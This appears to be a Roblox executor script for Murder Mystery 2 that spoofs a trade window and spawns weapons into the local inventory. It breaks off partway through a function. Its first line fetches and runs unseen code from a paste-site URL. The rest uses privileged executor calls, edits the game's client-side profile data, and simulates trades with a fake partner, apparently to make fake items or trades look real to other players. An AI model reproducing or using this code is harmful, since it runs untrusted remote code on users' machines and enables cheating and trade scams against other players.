loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WTXVzPS8uW/0"))()
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local LastTradePartner = nil

local function FormatValue(v)
	if v == nil then return "?" end
	if type(v) == "number" then
		local s = tostring(math.floor(v))
		local k
		repeat s, k = string.gsub(s, "^(-?%d+)(%d%d%d)", "%1,%2") until k == 0
		return s
	end
	return tostring(v)
end

setthreadidentity(2)
local ProfileData = require(game.ReplicatedStorage.Modules.ProfileData)
local InventoryModule = require(game.ReplicatedStorage.Modules.InventoryModule)
local ItemModule = require(game.ReplicatedStorage.Modules.ItemModule)
local Sync = require(game.ReplicatedStorage.Database.Sync)
local ItemPopupService = require(game.ReplicatedStorage.ClientServices.ItemPopupService)
setthreadidentity(8)

local TradeRemotes = game.ReplicatedStorage.Trade

local TradeGUI = game.Players.LocalPlayer.PlayerGui.TradeGUI
local TheirOffer = TradeGUI.Container.Trade.TheirOffer
local YourOffer = TradeGUI.Container.Trade.YourOffer

local SearchTextSignal
local TradeInventory

local functions = {}

local Config = {
	["item"] = "",
	["in_trade"] = false,
	["player2"] = nil
}

-- ============================================================
--  Untradable weapon filter
--  Sourced from the MM2 wiki:
--    * Unique rarity (the orange label) -- Corrupt is the ONLY tradable
--      Unique. Every other one is an event-leaderboard prize and is
--      permanently untradable.
--    * The four Evo gamepass weapons -- Reaver, Gingerscythe, Icecrusher
--      and Synthwave -- are untradable at EVERY evolution stage
--      (Rare -> Legendary -> Godly -> Ancient), so they are matched by
--      family name rather than by rarity.
--    * Unreleased "???" placeholder entries -- i.e. anything sitting in the
--      inventory that has no entry in Sync.Weapons, which is exactly why the
--      trade GUI renders them as "???".
--  NOTE: the weapon data carries NO tradability flag (Meta only has Rarity,
--  ItemName, ItemType, Chroma, FX, Event, Year), so untradables cannot be
--  detected automatically -- the name list below is the source of truth.
--  Matches never enter WeaponCatalog, SpawnItem refuses their keys, and
--  PurgeBlockedFromInventory strips any that are already owned.
-- ============================================================

local UntradableRarities = { Unique = true }
local UntradableRarityExceptions = { corrupt = true }

local UntradableFamilies = {
	"reaver",
	"gingerscythe",
	"icecrusher",
	"synthwave",
}

local EvoPrefixes = {
	Blue = true, Bronze = true, Silver = true, Gold = true,
	Platinum = true, Diamond = true, Emerald = true, Ruby = true,
	Obsidian = true, Crystal = true,
}

local function _isEvoWeapon(name, data)
	if type(data) == "table" then
		if data.Evo == true or data.Evolution == true then return true end
		if data.IsEvo == true or data.EvoTier ~= nil then return true end
		if type(data.MaxStack) == "number" and data.MaxStack <= 1 then return true end
		if type(data.MaxAmount) == "number" and data.MaxAmount <= 1 then return true end
	end
	if name then
		local firstWord = string.match(tostring(name), "^(%S+)")
		if firstWord and EvoPrefixes[firstWord] then return true end
	end
	return false
end

local function _isTradable(data)
	if type(data) ~= "table" then return false end
	if data.Tradable == false then return false end
	if data.CanTrade == false then return false end
	if data.Untradable == true then return false end
	if data.NonTradable == true then return false end
	if data.Locked == true then return false end
	return true
end

-- drops spaces, apostrophes and punctuation so "Red Icecrusher",
-- "C. Synthwave" and "Traveler's Gun" all flatten consistently
local function _blockKey(s)
	return (string.gsub(string.lower(tostring(s or "")), "[^%a%d]", ""))
end

-- nil when the weapon is fine, otherwise a reason string
local function WeaponBlockReason(name, rarity, data)
	local flat = _blockKey(name)

	if flat == "" or string.find(tostring(name or ""), "?", 1, true) then
		return "unreleased placeholder"
	end

	for _, family in ipairs(UntradableFamilies) do
		if string.find(flat, family, 1, true) then
			return "Evo gamepass weapon (untradable at every stage)"
		end
	end

	if UntradableRarities[rarity] and not UntradableRarityExceptions[flat] then
		return "untradable " .. tostring(rarity)
	end

	if not _isTradable(data) then
		return "flagged untradable by the game data"
	end

	if _isEvoWeapon(name, data) then
		return "Evo / leaderboard variant"
	end

	return nil
end

local BlockedWeaponKeys = {}

local WeaponCatalog = {}
local WeaponByKey = {}
local WeaponByName = {}
local RareWeaponKeys = {}
local RareRarities = { Godly = true, Ancient = true, Unique = true, Chroma = true, Legendary = true, Classic = true }
do
	local source = Sync.Weapons or Sync.Item
	local blockedCount = 0
	for key, data in pairs(source) do
		if type(data) == "table"
		   and (data.ItemType == "Knife" or data.ItemType == "Gun") then
			local rarity = data.Rarity or "Common"
			local isChroma = data.Chroma == true
			local name = data.ItemName or key

			local blockReason = WeaponBlockReason(name, rarity, data)
			if blockReason then
				BlockedWeaponKeys[key] = blockReason
				blockedCount = blockedCount + 1
				print(("[mm2run/filter] [x] %s (%s) -- %s"):format(name, rarity, blockReason))
			else
				local effectiveRarity = isChroma and "Chroma" or rarity
				local entry = {
					key = key,
					name = name,
					rarity = effectiveRarity,
					type = data.ItemType,
					chroma = isChroma,
				}
				table.insert(WeaponCatalog, entry)
				WeaponByKey[key] = entry
				WeaponByName[string.lower(entry.name)] = entry
				if RareRarities[effectiveRarity] then
					table.insert(RareWeaponKeys, key)
				end
			end
		end
	end
	print(("[mm2run/filter] %d weapons spawnable, %d untradable weapons removed"):format(#WeaponCatalog, blockedCount))
	local rarityOrder = {
		Chroma = 1, Godly = 2, Ancient = 3, Unique = 4, Legendary = 5, Classic = 6,
		Vintage = 7, Rare = 8, Uncommon = 9, Common = 10,
	}
	table.sort(WeaponCatalog, function(a, b)
		local ra = rarityOrder[a.rarity] or 99
		local rb = rarityOrder[b.rarity] or 99
		if ra ~= rb then return ra < rb end
		if a.type ~= b.type then return a.type < b.type end
		return a.name < b.name
	end)
end

-- resolves whatever shape ProfileData.Weapons.Owned uses into (itemKey, amount)
local function _ownedEntry(k, v)
	if type(k) == "number" then
		if type(v) == "string" then return v, 1 end
		if type(v) == "table" then
			return (v.Name or v.ItemName or v.Key or v.Id), (tonumber(v.Amount) or 1)
		end
		return nil, 0
	end
	if type(v) == "number" then return k, v end
	if type(v) == "table" then return k, (tonumber(v.Amount) or 1) end
	return k, 1
end

-- Strips untradable / unresolvable weapons out of the LOCAL ProfileData copy so
-- they cannot show up in the trade inventory or be put into an offer. This is
-- client-side only -- rejoining restores whatever you actually own.
-- Also prints every owned weapon so the console shows exactly what the game
-- calls each item, which is what the blocklist above has to be written against.
local function PurgeBlockedFromInventory()
	local removed = 0
	pcall(function()
		local owned = ProfileData.Weapons and ProfileData.Weapons.Owned
		if type(owned) ~= "table" then return end

		local kill = {}
		print("[mm2run/filter] ----- owned weapons -----")
		for k, v in pairs(owned) do
			local itemKey, amount = _ownedEntry(k, v)
			if itemKey then
				local data = Sync.Weapons and Sync.Weapons[itemKey]
				local displayName = (type(data) == "table" and data.ItemName) or tostring(itemKey)
				local rarity = (type(data) == "table" and (data.Rarity or "Common")) or "?"

				local reason
				if type(data) ~= "table" then
					reason = "no entry in the weapon database (renders as ???)"
				else
					reason = WeaponBlockReason(displayName, data.Rarity or "Common", data)
				end

				print(("[mm2run/filter]   %s %s x%s (%s)%s"):format(
					reason and "[x]" or "[ ]", displayName, tostring(amount), rarity,
					reason and ("  <- " .. reason) or ""))

				if reason then
					table.insert(kill, { k = k, name = displayName, reason = reason })
				end
			end
		end

		for _, item in ipairs(kill) do
			owned[item.k] = nil
			removed = removed + 1
		end
		print(("[mm2run/filter] ----- removed %d untradable weapon(s) from the inventory -----"):format(removed))
	end)

	if removed > 0 then
		pcall(function()
			game.ReplicatedStorage.Remotes.Inventory.InventoryDataChanged:Fire()
		end)
	end
	return removed
end

local function CheckForItem(ItemName, Type)
	local Owned = ProfileData[Type].Owned
	for Index, Value in pairs(Owned) do
		if Index == ItemName then
			return true, Value
		end
		if Value == ItemName then
			return true, 1
		end
	end
	return false
end

local function CheckForItem2(ItemName, Type)
	return true, math.huge
end

local v18 = {}
local function v22(v19)
	for _, v21 in pairs(v19:GetChildren()) do
		if v21:IsA("Frame") then
			v21.Visible = false
			if v18[v21] then
				v18[v21]:Disconnect()
				v18[v21] = nil
			end
		end
	end
end

local TradeTable = {
	["LastOffer"] = os.time(),
	["Locked"] = false,
	["Player1"] = {
		["Player"] = game.Players.LocalPlayer,
		["Accepted"] = false,
		["Offer"] = {}
	},
	["Player2"] = {
		["Player"] = "m0_3a",
		["Accepted"] = false,
		["Offer"] = {}
	},
}

local function SpawnItem(ItemName, Amount, ItemType)
	Amount = Amount or 1
	ItemType = ItemType or "Weapons"
	if ItemType == "Weapons" and BlockedWeaponKeys[ItemName] then
		warn(("[mm2run/filter] refused to spawn %s -- %s"):format(tostring(ItemName), BlockedWeaponKeys[ItemName]))
		return
	end
	pcall(function()
		if ProfileData[ItemType].Owned[ItemName] == nil then
			ProfileData[ItemType].Owned[ItemName] = Amount
		else
			ProfileData[ItemType].Owned[ItemName] = ProfileData[ItemType].Owned[ItemName] + Amount
		end
		game.ReplicatedStorage.Remotes.Inventory.InventoryDataChanged:Fire()
	end)
end

local function GiveItem(ItemName, Amount, ItemType)
	pcall(function()
		if ProfileData[ItemType].Owned[ItemName] == nil then
			ProfileData[ItemType].Owned[ItemName] = Amount
		else
			ProfileData[ItemType].Owned[ItemName] = ProfileData[ItemType].Owned[ItemName] + Amount
		end
		ItemPopupService.ItemReceived:Fire(ItemName, ItemType)
		game.ReplicatedStorage.Remotes.Inventory.InventoryDataChanged:Fire()
	end)
end

local function RemoveItem(ItemName, Amount, ItemType)
	pcall(function()
		local owned = ProfileData[ItemType].Owned[ItemName]
		if not owned then
			print("doesn't have the item")
			return
		end
		if owned - Amount > 0 then
			ProfileData[ItemType].Owned[ItemName] = owned - Amount
		else
			ProfileData[ItemType].Owned[ItemName] = nil
		end
		game.ReplicatedStorage.Remotes.Inventory.InventoryDataChanged:Fire()
	end)
end

local function AcceptTrade()
	if not TradeTable then return end

	if TradeTable["Player1"]["Accepted"] == true and TradeTable["Player2"]["Accepted"] == true then
		TradeTable["Locked"] = true
		task.wait(0.2)

		if TradeTable["Player1"]["Offer"] and next(TradeTable["Player1"]["Offer"]) ~= nil then
			for _, item in pairs(TradeTable["Player1"]["Offer"]) do
				local itemName = item[1]
				local amount = item[2]
				local itemType = item[3]
				pcall(function()
					RemoveItem(itemName, amount, itemType)
				end)
			end
		end

		if TradeTable["Player2"]["Offer"] and next(TradeTable["Player2"]["Offer"]) ~= nil then
			for _, item in pairs(TradeTable["Player2"]["Offer"]) do
				local itemName = item[1]
				local amount = item[2]
				local itemType = item[3]
				pcall(function()
					GiveItem(itemName, amount, itemType)
				end)
				pcall(function()
					_G.NewItem(itemName, "You Got...", nil, itemType, amount)
				end)
			end
		end

		pcall(function()
			TradeGUI.Enabled = false
		end)

		local partner = "m0_3a"
		if TradeTable.Player2 and TradeTable.Player2.Player then
			partner = TradeTable.Player2.Player
		end

		if partner and partner ~= "" and partner ~= "m0_3a" then
			LastTradePartner = partner
			pcall(function()
				if PartnerUserBox then
					PartnerUserBox.Text = partner
				end
			end)
		end

		TradeTable = {
			["LastOffer"] = os.time(),
			["Locked"] = false,
			["Player1"] = {
				["Player"] = game.Players.LocalPlayer,
				["Accepted"] = false,
				["Offer"] = {}
			},
			["Player2"] = {
				["Player"] = partner,
				["Accepted"] = false,
				["Offer"] = {}
			},
		}
		Config.in_trade = false
	end
end

local v84 = false

local function OfferItemLocalPlayer(ItemName,ItemType)
	if not TradeTable then return end
	if TradeTable["Locked"] == true then
		return
	end
	local AlreadyOffered = 0
	for _,Item in pairs(TradeTable["Player1"]["Offer"]) do
		if Item[1] == ItemName and Item[3] == ItemType then
			AlreadyOffered = Item[2]
		end
	end

	local HasItem,Amount = CheckForItem(ItemName,ItemType)
	if HasItem and Amount-AlreadyOffered > 0 then
		if AlreadyOffered == 0 then
			if #TradeTable["Player1"]["Offer"] < 4 then
				table.insert(TradeTable["Player1"]["Offer"], {ItemName,1,ItemType})
			end
		else
			for Index,Item in pairs(TradeTable["Player1"]["Offer"]) do
				if Item[1] == ItemName then
					TradeTable["Player1"]["Offer"][Index][2] = TradeTable["Player1"]["Offer"][Index][2] + 1
					break
				end
			end
		end
	end

	TradeTable["LastOffer"] = os.time()
	TradeTable["Player1"]["Accepted"] = false
	TradeTable["Player2"]["Accepted"] = false

	pcall(function()
		functions.UpdateTrade()
	end)
end

local function RemoveItemLocalPlayer(ItemName, ItemType)
	if not TradeTable then return end
	if TradeTable["Locked"] == true then
		return
	end

	if TradeTable["Player1"]["Accepted"] then
		return
	end
	TradeTable["LastOffer"] = os.time()
	TradeTable["Player1"]["Accepted"] = false
	TradeTable["Player2"]["Accepted"] = false
	for Index,Item in pairs(TradeTable["Player1"]["Offer"]) do
		if Item[1] == ItemName and Item[3] == ItemType then
			TradeTable["Player1"]["Offer"][Index][2] = TradeTable["Player1"]["Offer"][Index][2] - 1
			if TradeTable["Player1"]["Offer"][Index][2] <= 0 then
				table.remove(TradeTable["Player1"]["Offer"],Index)
			end
			break
		end
	end
	pcall(function()
		functions.UpdateTrade()
	end)
end

local function FindItemInDatabase(itemName, itemType)
	if not Sync[itemType] then return nil end

	if Sync[itemType][itemName] then
		return itemName, Sync[itemType][itemName]
	end

	return nil, nil
end

local function OfferItemAnotherPlayer(ItemName, ItemType)

	if not ItemName or ItemName == "" then
		return false
	end

	if not TradeTable then
		return false
	end

	if TradeTable["Locked"] == true then
		return false
	end

	if #TradeTable["Player2"]["Offer"] >= 4 then

		local foundExisting = false
		for _, Item in pairs(TradeTable["Player2"]["Offer"]) do
			if Item[1] == ItemName and Item[3] == ItemType then
				foundExisting = true
				break
			end
		end
		if not foundExisting then
			return false
		end
	end

	local AlreadyOffered = 0
	for _, Item in pairs(TradeTable["Player2"]["Offer"]) do
		if Item[1] == ItemName and Item[3] == ItemType then
			AlreadyOffered = Item[2]
		end
	end

	if AlreadyOffered == 0 then

		table.insert(TradeTable["Player2"]["Offer"], {ItemName, 1, ItemType})
	else

		for Index, Item in pairs(TradeTable["Player2"]["Offer"]) do
			if Item[1] == ItemName and Item[3] == ItemType then
				TradeTable["Player2"]["Offer"][Index][2] = TradeTable["Player2"]["Offer"][Index][2] + 1
				break
			end
		end
	end

	TradeTable["LastOffer"] = os.time()
	TradeTable["Player1"]["Accepted"] = false
	TradeTable["Player2"]["Accepted"] = false

	pcall(function()
		functions.UpdateTrade()
	end)

	return true
end

local function RemoveItemAnotherPlayer()
	if not TradeTable then return end
	if not TradeTable["Player2"] then return end
	if not TradeTable["Player2"]["Offer"] then return end

	if #TradeTable["Player2"]["Offer"] > 0 then
		if TradeTable["Player2"]["Accepted"] then
			return
		end

		local LastIndex = #TradeTable["Player2"]["Offer"]

		TradeTable["Player2"]["Offer"][LastIndex][2] = TradeTable["Player2"]["Offer"][LastIndex][2] - 1
		if TradeTable["Player2"]["Offer"][LastIndex][2] <= 0 then
			table.remove(TradeTable["Player2"]["Offer"], LastIndex)
		end

		TradeTable["LastOffer"] = os.time()
		TradeTable["Player1"]["Accepted"] = false
		TradeTable["Player2"]["Accepted"] = false

		pcall(function()
			functions.UpdateTrade()
		end)
	end
end

local function v34(v23, v24)
	for v25, v26 in v24 do
		local ItemID = v26[1] or v26.ItemID
		local Amount = v26[2] or v26.Amount
		local ItemType = v26[3] or v26.ItemType

		local v33 = v23.Container["NewItem" .. v25]
		if not v33 then continue end

		local success = pcall(function()
			if Sync[ItemType] and Sync[ItemType][ItemID] then
				local v30 = {}
				for v31, v32 in pairs(Sync[ItemType][ItemID]) do
					v30[v31] = v32
				end
				v30.DataType = ItemType
				v30.Amount = Amount
				ItemModule.DisplayItem(v33, v30)
			end
		end)

		pcall(function()
			if v18[v33] then
				v18[v33]:Disconnect()
			end
			if v33.Container and v33.Container:FindFirstChild("ActionButton") then
				v18[v33] = v33.Container.ActionButton.MouseButton1Click:Connect(function()
					RemoveItemLocalPlayer(ItemID, ItemType)
				end)
			end
		end)

		v33.Visible = true
	end
end

local v85 = 6
local function ResetCooldown(arg1)
	if arg1 then
		TradeGUI.Container.Trade.Actions.Accept.Cooldown.Visible = false
		v85 = 0
		v84 = false
		return
	else
		TradeGUI.Container.Trade.Actions.Accept.Cooldown.Visible = true
		v85 = 6
		TradeGUI.Container.Trade.Actions.Accept.Cooldown.Title.Text = " Please wait (" .. v85 .. ") before accepting."
		if not v84 then
			TradeGUI.Container.Trade.Actions.Accept.Cooldown.Visible = true
			v84 = true
			repeat
				wait(1)
				v85 = v85 - 1
				TradeGUI.Container.Trade.Actions.Accept.Cooldown.Title.Text = " Please wait (" .. v85 .. ") before accepting."
			until v85 <= 0
			v84 = false
			TradeGUI.Container.Trade.Actions.Accept.Cooldown.Visible = false
			return
		else
			v85 = 6
			return
		end
	end
end

local function UpdateTradeInventory()
	pcall(function()
		if not TradeInventory or not TradeInventory.Data then return end
		local l_Offer_2 = TradeTable["Player1"].Offer
		for v63, v64 in pairs(TradeInventory.Data) do
			for _, v66 in pairs(v64) do
				for v67, v68 in pairs(v66) do
					local l_Frame_0 = v68.Frame
					local l_Amount_0 = v68.Amount
					for _, v72 in pairs(l_Offer_2) do
						local v73 = v72[1] or v72.ItemID
						local v74 = v72[2] or v72.Amount
						local v75 = v72[3] or v72.ItemType
						if v73 == v67 and v75 == v63 then
							l_Amount_0 = l_Amount_0 - v74
						end
					end
					if l_Amount_0 == 1 then
						l_Frame_0.Container.Amount.Text = ""
						l_Frame_0.Visible = true
					elseif l_Amount_0 > 1 then
						l_Frame_0.Container.Amount.Text = "x" .. l_Amount_0
						l_Frame_0.Visible = true
					elseif l_Amount_0 < 1 then
						l_Frame_0.Visible = false
					end
				end
			end
		end
	end)
end

local v35 = "Accept"
functions.UpdateTrade = function()
	pcall(function()
		local Offer1 = TradeTable.Player1.Offer
		local Offer2 = TradeTable.Player2.Offer

		v22(YourOffer.Container)
		v22(TheirOffer.Container)

		v34(YourOffer, Offer1)
		v34(TheirOffer, Offer2)

		v35 = "Accept"

		TradeGUI.Container.Trade.Actions.Accept.Confirm.Visible = false
		TradeGUI.Container.Trade.Actions.Accept.Cancel.Visible = false
		YourOffer.Accepted.Visible = false
		TheirOffer.Accepted.Visible = false

		local l_AddItem_0 = TradeGUI.Container.Trade.Actions.Accept.AddItem
		local v44 = false
		if #Offer1 < 1 then
			v44 = #Offer2 < 1
		end
		l_AddItem_0.Visible = v44
		UpdateTradeInventory()
		l_AddItem_0 = ResetCooldown
		v44 = false
		if #Offer1 < 1 then
			v44 = #Offer2 < 1
		end
		l_AddItem_0(v44)
	end)
end

function DeclineTrade()
	pcall(function()
		TradeGUI.Enabled = false
	end)

	local partner = "m0_3a"
	if TradeTable and TradeTable.Player2 and TradeTable.Player2.Player then
	
